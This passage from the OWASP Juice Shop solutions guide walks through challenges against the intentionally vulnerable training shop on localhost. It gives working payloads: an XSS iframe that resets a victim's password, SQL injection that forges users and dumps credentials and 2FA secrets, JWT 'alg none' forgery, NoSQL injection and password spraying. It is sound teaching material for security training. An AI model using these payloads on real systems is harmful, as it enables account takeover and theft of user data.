<p>Comparing the route mapping to others shows you that here a <code>matcher</code>
is mapped to a <code>component</code> whereas most other mappings map a <code>path</code>
to their <code>component</code>.</p>
</li>
<li>
<p>The code that gives you the sought-after path is the code block
passed into the <code>match()</code> function inside <code>Ca(l)</code>!</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-tokensale_path-block.png" alt="Code block returning the Tokensale path">
</div>
</div>
</li>
<li>
<p>Copying that inner code block and executing that in your console
will still yield an error!</p>
</li>
<li>
<p>You need to append it to a string to make it work, which will
<strong>finally</strong> yield the path <code>/tokensale-ico-ea</code>.</p>
</li>
<li>
<p>Navigate to <a href="http://localhost:3000/#/tokensale-ico-ea" class="bare">http://localhost:3000/#/tokensale-ico-ea</a> to solve this
challenge.</p>
</li>
</ol>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-javascript hljs" data-lang="javascript">"" + function() {
                for (var l = [], n = 0; n &lt; arguments.length; n++)
                    l[n] = arguments[n];
                var e = Array.prototype.slice.call(l)
                  , t = e.shift();
                return e.reverse().map(function(l, n) {
                    return String.fromCharCode(l - t - 45 - n)
                }).join("")
            }(25, 184, 174, 179, 182, 186) + 36669..toString(36).toLowerCase() + function() {
                for (var l = [], n = 0; n &lt; arguments.length; n++)
                    l[n] = arguments[n];
                var e = Array.prototype.slice.call(arguments)
                  , t = e.shift();
                return e.reverse().map(function(l, n) {
                    return String.fromCharCode(l - t - 24 - n)
                }).join("")
            }(13, 144, 87, 152, 139, 144, 83, 138) + 10..toString(36).toLowerCase()</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_change_benders_password_into_slurmcl4ssic_without_using_sql_injection_or_forgot_password"><a class="anchor" href="#_change_benders_password_into_slurmcl4ssic_without_using_sql_injection_or_forgot_password"></a>Change Bender&#8217;s password into slurmCl4ssic without using SQL Injection or Forgot Password</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as anyone.</p>
</li>
<li>
<p>Inspecting the backend HTTP calls of the <em>Password Change</em> form
reveals that these happen via <code>HTTP GET</code> and submits current and new
password in clear text.</p>
</li>
<li>
<p>Probe the responses of <code>/rest/user/change-password</code> on various
inputs:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://localhost:3000/rest/user/change-password?current=A" class="bare">http://localhost:3000/rest/user/change-password?current=A</a> yields
a <code>401</code> error saying <code>Password cannot be empty.</code></p>
</li>
<li>
<p><a href="http://localhost:3000/rest/user/change-password?current=A&amp;new=B" class="bare">http://localhost:3000/rest/user/change-password?current=A&amp;new=B</a>
yields a <code>401</code> error saying <code>New and repeated password do not
match.</code></p>
</li>
<li>
<p><a href="http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=C" class="bare">http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=C</a>
also says <code>New and repeated password do not match.</code></p>
</li>
<li>
<p><a href="http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=B" class="bare">http://localhost:3000/rest/user/change-password?current=A&amp;new=B&amp;repeat=B</a>
says <code>Current password is not correct.</code></p>
</li>
<li>
<p><a href="http://localhost:3000/rest/user/change-password?new=B&amp;repeat=B" class="bare">http://localhost:3000/rest/user/change-password?new=B&amp;repeat=B</a>
yields a <code>200</code> success returning the updated user as JSON!</p>
</li>
</ul>
</div>
</li>
<li>
<p>Now
<a href="#log-in-with-benders-user-account">Log in with Bender&#8217;s user account</a>
using SQL Injection.</p>
</li>
<li>
<p>Craft a GET request with Bender&#8217;s <code>Authorization Bearer</code> header to
<a href="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic" class="bare">http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic</a>
to solve the challenge.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/csrf_postman.png" alt="GET request via PostMan">
</div>
</div>
</li>
</ol>
</div>
<div class="sect3">
<h4 id="_bonus_round_delivering_the_attack_via_reflected_xss"><a class="anchor" href="#_bonus_round_delivering_the_attack_via_reflected_xss"></a>Bonus Round: Delivering the attack via reflected XSS</h4>
<div class="paragraph">
<p>If you want to craft an actually realistic attack against
<code>/rest/user/change-password</code> that you could send a user as a malicious
link, you will have to invest a bit extra work, because a simple attack
like <em>Search</em> for <code>&lt;img
src="http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic"&gt;</code>
will not work. Making someone click on the corresponding attack link
<a href="http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E" class="bare">http://localhost:3000/#/search?q=%3Cimg%20src%3D%22http:%2F%2Flocalhost:3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26repeat%3DslurmCl4ssic%22%3E</a>
will return a <code>500</code> error when loading the image URL with a message
clearly stating that your attack ran against a security-wall: <code>Error:
Blocked illegal activity</code></p>
</div>
<div class="paragraph">
<p>To make this exploit work, some more sophisticated attack URL is
required:</p>
</div>
<div class="paragraph">
<p><a href="http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E" class="bare">http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E</a></p>
</div>
<div class="paragraph">
<p>Pretty-printed this attack is easier to understand:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-html hljs" data-lang="html">&lt;iframe src="javascript:xmlhttp = new XMLHttpRequest();
   xmlhttp.open('GET', 'http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&amp;amp;repeat=slurmCl4ssic');
   xmlhttp.setRequestHeader('Authorization',`Bearer=${localStorage.getItem('token')}`);
   xmlhttp.send();"&gt;
&lt;/iframe&gt;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Anyone who is logged in to the Juice Shop while clicking on this link
will get their password set to the same one we forced onto Bender!</p>
</div>
<div class="paragraph">
<p>👏 Kudos to Joe Butler, who originally described this advanced XSS
payload in his blog post
<a href="https://incognitjoe.github.io/hacking-the-juice-shop.html">Hacking(and automating!) the OWASP Juice Shop</a>.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_stick_cute_cross_domain_kittens_all_over_our_delivery_boxes"><a class="anchor" href="#_stick_cute_cross_domain_kittens_all_over_our_delivery_boxes"></a>Stick cute cross-domain kittens all over our delivery boxes</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in with any user and go to
<a href="http://localhost:3000/#/deluxe-membership" class="bare">http://localhost:3000/#/deluxe-membership</a></p>
</li>
<li>
<p>Right-click and <em>Inspect</em> the image of the delivery boxes with the
Juice Shop logo on them.</p>
</li>
<li>
<p>You will notice that this image is in fact an inline <code>&lt;svg&gt;</code> tag that
includes six <code>&lt;image&gt;</code> tags. One is loading
<code>assets/public/images/deluxe/blankBoxes.png</code> and the other five load
<code>assets/public/images/JuiceShop_Logo.png</code> in different sizes and
positions onto the SVG graphic.</p>
</li>
<li>
<p>Open the <code>main.js</code> in your browser DevTools and search for the
corresponding Angular controller code related to that page and SVG
image</p>
</li>
<li>
<p>You will be able to spot six <code>:svg:image</code> references, one of them
<code>blankBoxes.png</code> and the other five seemingly unspecified at that
time.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_inline_svg.png" alt="Inline SVG in Angular controller">
</div>
</div>
</li>
<li>
<p>Scrolling only slightly further down, you will notice a code location
where a property <code>t.logoSrc</code> is passed into some non-descriptive
function five times.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_apply_logoSrc.png" alt="Property logoSrc passed into SVG five times">
</div>
</div>
</li>
<li>
<p>Scroll up in the source code a few hundred lines until you reach the
declaration of the controller (<code>class Ht</code> in the following
screenshot). There you find the definition of <code>this.logoSrc =
"assets/public/images/JuiceShop_Logo.png"</code>.</p>
</li>
<li>
<p>In the subsequent <code>ngOnInit()</code> function is overwritten with either
the <code>application.logo</code> value coming out of the
<code>getApplicationConfiguration()</code> service&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;or - if specified - the value of the URL query parameter
<code>testDecal</code>! It seems the developers used this for testing the
overlay images on the SVG but forgot to remove it before go-live!
D&#8217;uh!</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_testDecal.png" alt="Forgotten query parameter testDecal">
</div>
</div>
</li>
<li>
<p>Try the <code>testDecal</code> parameter, e.g. by going to
<a href="http://localhost:3000/#/deluxe-membership?testDecal=test" class="bare">http://localhost:3000/#/deluxe-membership?testDecal=test</a>. You will
notice that the logos on the boxes are now gone or display a broken
image symbol.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_apply_testDecal.png" alt="Probing the behavior of testDecal">
</div>
</div>
</li>
<li>
<p>As the logo references are relative, you cannot simply do e.g.
<a href="http://localhost:3000/#/deluxe-membership?testDecal=https:%2F%2Fplacekitten.com%2Fg%2F400%2F500" class="bare">http://localhost:3000/#/deluxe-membership?testDecal=https:%2F%2Fplacekitten.com%2Fg%2F400%2F500</a>
as this would result in the application to request the logos from
the relative URL
<code>assets/public/images/https://placekitten.com/g/400/500</code> which
obviously cannot work.</p>
</li>
<li>
<p>As you are dealing with a relative path, you can try if path
traversal works, so you could get to the root of the web server e.g.
via
<a href="http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest" class="bare">http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest</a>.
This will indeed result in the image actually being requested as
<a href="http://localhost:3000/test" class="bare">http://localhost:3000/test</a>!</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_testDecal_path_traversal.png" alt="Testing path traversal via testDecal">
</div>
</div>
</li>
<li>
<p>It might not seem like it, but this behavior is a huge step forward!
If the Juice Shop web server only offered a URL which would be able
to <em>redirect</em> you to any external location and grab those images&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;which <em>it does</em> in the form of the
<a href="http://localhost:3000/redirect" class="bare">http://localhost:3000/redirect</a> endpoint! If you haven&#8217;t done so
yet, you should stop here and
<a href="#enforce-a-redirect-to-a-page-you-are-not-supposed-to-redirect-to">Enforce a redirect to a page you are not supposed to redirect to</a>
first!</p>
</li>
<li>
<p>Combining that redirect exploit with the forgotten <code>testDecal</code> and
its susceptibility to path traversal will allow you to craft a URL
like
<a href="http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop" class="bare">http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop</a>
where the most difficult part is to get the URL encoding just right
to bypass the redirect allowlist and still get the intended image
returned cross-domain.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/delivery-boxes_placeKitten.png" alt="Placekitten images put on the delivery boxes">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_dumpster_dive_the_internet_for_a_leaked_password_and_log_in_to_the_original_user_account_it_belongs_to"><a class="anchor" href="#_dumpster_dive_the_internet_for_a_leaked_password_and_log_in_to_the_original_user_account_it_belongs_to"></a>Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="https://stackoverflow.com/questions/tagged/access-log" class="bare">https://stackoverflow.com/questions/tagged/access-log</a> to find
all questions tagged with <code>access-log</code> in this popular platform</p>
</li>
<li>
<p>The list of questions should not be excessive and one mentioning a
familiar URL path might immediately stand out</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/stackoverflow_access-log.png" alt="Questions tagged 'access-log' on StackOverflow">
</div>
</div>
</li>
<li>
<p>Visit
<a href="https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan" class="bare">https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan</a>
to find more unambiguous URL paths from the Juice Shop in it</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/stackoverflow_morgan_question.png" alt="Question on expressjs/morgan configuration">
</div>
</div>
</li>
<li>
<p>Follow the link to PasteBin that is mentioned below the log file
snippet in <em>"(see <a href="https://pastebin.com/4U1V1UjU" class="bare">https://pastebin.com/4U1V1UjU</a> for more)"</em></p>
</li>
<li>
<p>On <a href="https://pastebin.com/4U1V1UjU" class="bare">https://pastebin.com/4U1V1UjU</a> search for <code>password</code> to find log
entries that might help with the ultimate challenge goal</p>
</li>
<li>
<p>You will find one particularly interesting <code>GET</code> request that has
been logged as <code>161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET
/rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lB&amp;new=sjss22%@%E2%82%AC55jaJasj!.k&amp;repeat=sjss22%@%E2%82%AC55jaJasj!.k8
HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux;
Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/71.0.3578.99 Mobile Safari/537.36"</code></p>
</li>
<li>
<p>The mismatched <code>new</code> and <code>repeat</code> parameters and the return code of
<code>401</code> indicate that this password change failed. This means the
password could still be the current one of
<code>0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&amp;6lB</code>!</p>
</li>
<li>
<p>This isn&#8217;t the exact clear text password, though. It was logged as
part of a URL, so it needs to be URL-decoded into
<code>0Y8rMnww$*9VFYE§59-!Fg1L6t&amp;6lB</code> first.</p>
</li>
<li>
<p>Not knowing which user it belongs to, you can now</p>
<div class="ulist">
<ul>
<li>
<p>either perform a <em>Password Spraying</em> attack by trying to log in
with the password for all known user emails, e.g. from
<a href="#access-the-administration-section-of-the-store">Access the administration section of the store</a></p>
</li>
<li>
<p>hash the known password with <code>MD5</code> and compare it to the password
hashes harvested from
<a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Either way you will conclude that the password belongs to
<code>J12934@juice-sh.op</code> so using this as <em>Email</em> and
<code>0Y8rMnww$*9VFYE§59-!Fg1L6t&amp;6lB</code> as <em>Password</em> on
<a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a> will solve the challenge</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>🤡 Did you notice that one of the next requests of <code>161.194.17.103</code> in
the leaked access log went to <a href="http://localhost:3000/api/Complaints" class="bare">http://localhost:3000/api/Complaints</a> and
returned a <code>201 Created</code> HTTP status code? It seems the user
successfully complained, but eventually didn&#8217;t bother or was too
frustrated to finish what he originally planned to do.</p>
</div>
</div>
<div class="sect2">
<h3 id="_perform_an_unwanted_information_disclosure_by_accessing_data_cross_domain"><a class="anchor" href="#_perform_an_unwanted_information_disclosure_by_accessing_data_cross_domain"></a>Perform an unwanted information disclosure by accessing data cross-domain</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Find a request to the <code>/rest/user/whoami</code> API endpoint. Notice
that you can remove the "Authorization" header and it still works.
<span class="image"><img src="../_images/appendix/normal_whoami.png" alt="Normal whoami call"></span></p>
</li>
<li>
<p>Add a URL parameter called "callback". This will cause the API to
return the content as a JavaScript fragment (JSONP) rather than just
a standard JSON object.
<span class="image"><img src="../_images/appendix/jsonp_whoami.png" alt="whoami call using JSONP"></span></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_the_non_existing_accountant_without_ever_registering_that_user"><a class="anchor" href="#_log_in_with_the_non_existing_accountant_without_ever_registering_that_user"></a>Log in with the (non-existing) accountant without ever registering that user</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a> and try logging in with <em>Email</em>
<code>'</code> and any <em>Password</em> while observing the Browser DevTools network
tab.</p>
</li>
<li>
<p>You will notice the SQL query for the login in the error being
thrown: <code>"sql": "SELECT * FROM Users WHERE email = ''' AND password =
'339df5aeae5bc6ae557491e02619c5dd' AND deletedAt IS NULL"</code></p>
</li>
<li>
<p>Solve
<a href="#exfiltrate-the-entire-db-schema-definition-via-sql-injection">Exfiltrate the entire DB schema definition via SQL Injection</a>
to learn the exact column names of the <code>Users</code> table.</p>
</li>
<li>
<p>Prepare a <code>UNION SELECT</code> payload what will a) ensure there is no
result from the original query and b) will add the needed user
on-the-fly using static values in the query.</p>
</li>
<li>
<p>Log in with <em>Email</em> <code>' UNION SELECT * FROM (SELECT 15 as 'id', '' as
'username', '<a href="mailto:acc0unt4nt@juice-sh.op">acc0unt4nt@juice-sh.op</a>' as 'email', '12345' as
'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4'
as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as
'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16
14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00'
as 'updatedAt', null as 'deletedAt')--</code></p>
</li>
<li>
<p>This will trick the application backend into handing out a valid JWT
token and thus establishing a user session.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_retrieve_the_language_file_that_never_made_it_into_production"><a class="anchor" href="#_retrieve_the_language_file_that_never_made_it_into_production"></a>Retrieve the language file that never made it into production</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Monitoring the HTTP calls to the backend when switching languages
tells you how the translations are loaded:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://localhost:3000/i18n/en.json" class="bare">http://localhost:3000/i18n/en.json</a></p>
</li>
<li>
<p><a href="http://localhost:3000/i18n/de_DE.json" class="bare">http://localhost:3000/i18n/de_DE.json</a></p>
</li>
<li>
<p><a href="http://localhost:3000/i18n/nl_NL.json" class="bare">http://localhost:3000/i18n/nl_NL.json</a></p>
</li>
<li>
<p><a href="http://localhost:3000/i18n/zh_CN.json" class="bare">http://localhost:3000/i18n/zh_CN.json</a></p>
</li>
<li>
<p><a href="http://localhost:3000/i18n/zh_HK.json" class="bare">http://localhost:3000/i18n/zh_HK.json</a></p>
</li>
<li>
<p>etc.</p>
</li>
</ul>
</div>
</li>
<li>
<p>It is obvious the language files are stored with the official
<em>locale</em> as name using underscore notation.</p>
</li>
<li>
<p>Nonetheless, even brute forcing all thinkable locale codes (<code>aa_AA</code>,
<code>ab_AA</code>, &#8230;&#8203;, <code>zz_ZY</code>, <code>zz_ZZ</code>) would still <strong>not</strong> solve the
challenge.</p>
</li>
<li>
<p>The hidden language is <em>Klingon</em> which is represented by a
three-letter code <code>tlh</code> with the dummy country code <code>AA</code>.</p>
</li>
<li>
<p>Request <a href="http://localhost:3000/i18n/tlh_AA.json" class="bare">http://localhost:3000/i18n/tlh_AA.json</a> to solve the
challenge. majQa'!</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Instead of expanding your brute force pattern (which is not a very
obvious decision to make) you can more easily find the solution to this
challenge by investigating which languages are supported in the Juice
Shop and how <a href="../part3/translation.html" class="xref page">the translations</a> are managed.
This will quickly bring you over to
<a href="https://crowdin.com/project/owasp-juice-shop" class="bare">https://crowdin.com/project/owasp-juice-shop</a> which immediately
spoilers <em>Klingon</em> as a supported language. Hovering over the
corresponding flag will eventually spoiler the language code <code>tlh_AA</code>.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/crowdin_klingon-spoiler.png" alt="Crowdin Klingon Spoiler">
</div>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>The Klingon language was originally created to add realism to a race
of fictional aliens who inhabit the world of Star Trek, an American
television and movie franchise. Although Klingons themselves have
never existed, the Klingon language is real. It has developed from
gibberish to a usable means of communication, complete with its own
vocabulary, grammar, figures of speech, and even slang and regional
dialects. Today it is spoken by humans all over the world, in many
contexts.<sup class="footnote" id="_footnote_3">[<a id="_footnoteref_3" class="footnote" href="#_footnotedef_3" title="View footnote.">3</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_solve_the_2fa_challenge_for_user_wurstbrot"><a class="anchor" href="#_solve_the_2fa_challenge_for_user_wurstbrot"></a>Solve the 2FA challenge for user "wurstbrot"</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p><a href="#access-the-administration-section-of-the-store">Access the administration section of the store</a>
while inspecting network traffic.</p>
</li>
<li>
<p>You will learn the email address of the user in question is
unsurprisingly <code>wurstbrot@juice-sh.op</code>.</p>
</li>
<li>
<p>You will also notice that there is no information about any user&#8217;s
2FA configuration in the responses from <code>/api/Users</code>.</p>
</li>
<li>
<p>Solve
<a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a>
and keep its final attack payload ready.</p>
</li>
<li>
<p>Change the one of the <code>null</code>s in payload to hopefully find a column
that contains the secret key for the 2FA setup:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fa,null,null,null,null%20from%20users--</a>
yields a <code>500</code> error with <code>SequelizeDatabaseError: SQLITE_ERROR: no
such column: 2fa</code>.</p>
</li>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fakey,null,null,null,null%20from%20users--</a>
fails with <code>no such column: 2fakey</code>.</p>
</li>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,2fasecret,null,null,null,null%20from%20users--</a>
fails with <code>no such column: 2fasecret</code>.</p>
</li>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totp,null,null,null,null%20from%20users--</a>
also fails with <code>no such column: totp</code>.</p>
</li>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpkey,null,null,null,null%20from%20users--</a>
fails again yielding <code>no such column: totpkey</code>.</p>
</li>
<li>
<p><a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--</a>
finally succeeds with a <code>200</code> response as this column exists!</p>
</li>
</ul>
</div>
</li>
<li>
<p>In the response from
<a href="http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--" class="bare">http://localhost:3000/rest/products/search?q=%27))%20union%20select%20null,id,email,password,totpsecret,null,null,null,null%20from%20users--</a>
find the entry of user <code>wurstbrot@juice-sh.op</code> with
<code>"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH"</code> whereas all other users
have <code>"image":""</code> set.</p>
</li>
<li>
<p>Using your favorite 2FA application (e.g.
<a href="https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2">Google Authenticator</a>)
create a new entry, but instead of scanning any QR code type in the
key <code>IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH</code> manually.</p>
</li>
<li>
<p>Go to <a href="http:localhost:3000/<mark>/login">http:localhost:3000/</mark>/login</a> and use SQL Injection to log in
with <code>wurstbrot@juice-sh.op'--</code> as <em>Username</em> and anything as
<em>Password</em>.</p>
</li>
<li>
<p>You will be presented with the <em>Two Factor Authentication</em> input
screen where you now have to type in the 6-digit code currently
displayed on your 2FA app.</p>
<div class="paragraph">
<p><span class="image"><img src="../_images/appendix/2fa_authenticator.png" alt="Google Authenticator for wurstbrot"></span>
<span class="image"><img src="../_images/appendix/2fa_challenge.png" alt="2FA input dialog"></span></p>
</div>
</li>
<li>
<p>After clicking <em>Log in</em> you are logged in and the challenge will be
marked as solved!</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_forge_an_essentially_unsigned_jwt_token"><a class="anchor" href="#_forge_an_essentially_unsigned_jwt_token"></a>Forge an essentially unsigned JWT token</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user to receive a valid JWT in the <code>Authorization</code>
header.</p>
</li>
<li>
<p>Copy the JWT (i.e. everything after <code>Bearer ` in the `Authorization</code>
header) and decode it.</p>
</li>
<li>
<p>Under the <code>payload</code> property, change the <code>email</code> attribute in the
JSON to <code>jwtn3d@juice-sh.op</code>.</p>
</li>
<li>
<p>Change the value of the <code>alg</code> property in the <code>header</code> part from
<code>HS256</code> to <code>none</code>.</p>
</li>
<li>
<p>Encode the <code>header</code> to <code>base64url</code>. Similarly, encode the <code>payload</code>
to <code>base64url</code>. <em>base64url makes it URL safe</em>, a regular Base64
encode might not work!</p>
</li>
<li>
<p>Join the two strings obtained above with a <code>.</code> (dot symbol) and add a
<code>.</code> at the end of the obtained string. So, effectively it becomes
<code>base64url(header).base64url(payload).</code></p>
</li>
<li>
<p>Change the <code>Authorization</code> header of a subsequent request to the
retrieved JWT (prefixed with <code>Bearer ` as before) and submit the
request. Alternatively you can set the `token</code> cookie to the JWT
which be used to populate any future request with that header.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_all_your_orders_are_belong_to_us"><a class="anchor" href="#_all_your_orders_are_belong_to_us"></a>All your orders are belong to us</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open the network tab of your browser&#8217;s DevTools.</p>
</li>
<li>
<p>Log in with any user that previously ordered something and visit <a href="http://localhost:3000/#/order-history" class="bare">http://localhost:3000/#/order-history</a></p>
</li>
<li>
<p>Click on the <em>Track Order</em> button (depicting a truck) of any order</p>
</li>
<li>
<p>Witness a <code>GET</code> request to a URL starting with <code>http://localhost:3000/rest/track-order/</code> and ending with a seemingly random sequence of characters (which is actually the <em>Order ID</em>)</p>
</li>
<li>
<p>Try out <a href="http://localhost:3000/rest/track-order/x" class="bare">http://localhost:3000/rest/track-order/x</a> to receive a response of <code>{"status":"success","data":[{"orderId":"x"}]}</code>.</p>
</li>
<li>
<p>Search for <code>'</code> (single quote) as <em>Order ID</em> now.
<a href="http://localhost:3000/rest/track-order/'" class="bare">http://localhost:3000/rest/track-order/'</a> will throw an error</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/error_page-nosqli.png" alt="NoSQL query error from invalid token">
</div>
</div>
</li>
<li>
<p>Searching for <code>''</code> (two single quotes) as <em>Order ID</em> now will let
<a href="http://localhost:3000/rest/track-order/''" class="bare">http://localhost:3000/rest/track-order/''</a> throw an <code>Unexpected
string</code> error instead of the previous <code>Invalid or unexpected token</code>.</p>
</li>
<li>
<p>While not stated anywhere in the error messages, it can be assumed
with some MongoDB background that the query probably resembles
something like <code>{ $where: "property === '" + payload + "'" }</code>.</p>
</li>
<li>
<p>The required <code>payload</code> for the challenge needs to make sure all data
is matched while squeezing itself into the query in a non-breaking
way.</p>
</li>
<li>
<p>Search for <code>' || true || '</code> resulting in
<a href="http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'" class="bare">http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'</a>
which will in fact query and return all orders from the MarsDB.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_remote_code_execution_that_would_keep_a_less_hardened_application_busy_forever"><a class="anchor" href="#_perform_a_remote_code_execution_that_would_keep_a_less_hardened_application_busy_forever"></a>Perform a Remote Code Execution that would keep a less hardened application busy forever</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>By manual or automated URL discovery you can find a
<a href="https://swagger.io">Swagger</a> API documentation hosted at
<a href="http://localhost:3000/api-docs" class="bare">http://localhost:3000/api-docs</a> which describes the B2B API.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/swagger_api-docs.png" alt="Swagger API-Docs">
</div>
</div>
</li>
<li>
<p>This API allows to <code>POST</code> orders where the order lines can be sent as
